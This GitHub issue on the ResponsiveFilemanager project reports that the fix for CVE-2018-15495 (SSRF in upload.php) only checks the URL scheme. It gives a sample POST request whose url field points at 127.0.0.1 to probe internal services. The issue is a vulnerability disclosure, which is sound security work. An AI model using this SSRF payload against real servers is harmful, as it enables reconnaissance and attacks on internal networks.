## Description

[![@donot-wong](https://avatars.githubusercontent.com/u/23161141?u=afffcaf39a1067b617f84b212c485edb64bb600a&v=4&size=48)](/donot-wong)[donot-wong](https://github.com/donot-wong)opened [on Oct 30, 2018](https://github.com/trippo/ResponsiveFilemanager/issues/506#issue-375398760)

In upload.php we can download a pic in remote server. code in line 68~91。

Jul 27, 2018 commit a fix to limit url in order to prohibit ssrf vuln

[CVE-2018-15495](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15495)

but the fix only check the parm url startwith http:// or https://

we still can use http protocol to Probe intranet and attack intarnet server。For Example:

`POST /filemanager/upload.php HTTP/1.1

Host: localhost

Cache-Control: max-age=0

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

fldr=test/&url=[http://127.0.0.1:2233/aaaaaaa`](http://127.0.0.1:2233/aaaaaaa%60)
